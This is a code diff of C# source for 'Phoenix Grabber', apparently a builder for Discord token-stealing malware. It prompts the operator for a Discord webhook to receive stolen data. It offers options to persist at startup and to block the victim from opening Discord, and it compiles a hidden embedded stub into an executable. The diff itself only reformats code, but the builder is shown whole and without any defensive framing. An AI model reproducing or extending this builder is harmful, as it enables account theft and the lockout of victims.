@@ -1,7 +1,6 @@
 ﻿using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
 
 /* 
@@ -28,8 +27,7 @@ namespace PhoenixGrabber
         #region Main
         static void Main()
         {
-            using (var stream = new FileStream(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write))
-                stream.Write(Properties.Resources.BouncyCastle_Crypto, 0, Properties.Resources.BouncyCastle_Crypto.Length);
+            using (var stream = new FileStream(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write)) { stream.Write(Properties.Resources.BouncyCastle_Crypto, 0, Properties.Resources.BouncyCastle_Crypto.Length); }
             Console.Title = "Phoenix Grabber";
             Console.Clear();
             Console.Write("Discord Webhook: ");
@@ -60,17 +58,11 @@ namespace PhoenixGrabber
             Console.Clear();
             Console.WriteLine("Runs the program once the computer is started.\n");
             Console.Write("Run On Startup: (Y/N): ");
-            if (Console.ReadLine().ToLower() == "y")
-            {
-                RunOnStartup = true;
-            }
+            if (Console.ReadLine().ToLower() == "y") RunOnStartup = true;
             Console.Clear();
             Console.WriteLine("Prevents user from opening Discord in browser/app.\n");
             Console.Write("Block Discord: (Y/N): ");
-            if (Console.ReadLine().ToLower() == "y")
-            {
-                BlockDiscord = true;
-            }
+            if (Console.ReadLine().ToLower() == "y") BlockDiscord = true;
             Console.Clear();
             Console.Write("File Name: ");
             FileName = Console.ReadLine();
@@ -108,10 +100,7 @@ namespace PhoenixGrabber
         {
             string stub = Properties.Resources.Stub;
             stub = Base(stub);
-            List<string> code = new List<string>
-            {
-                stub
-            };
+            List<string> code = new List<string> { stub };
             CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
             CompilerParameters compars = new CompilerParameters();
             compars.ReferencedAssemblies.Add("System.dll");
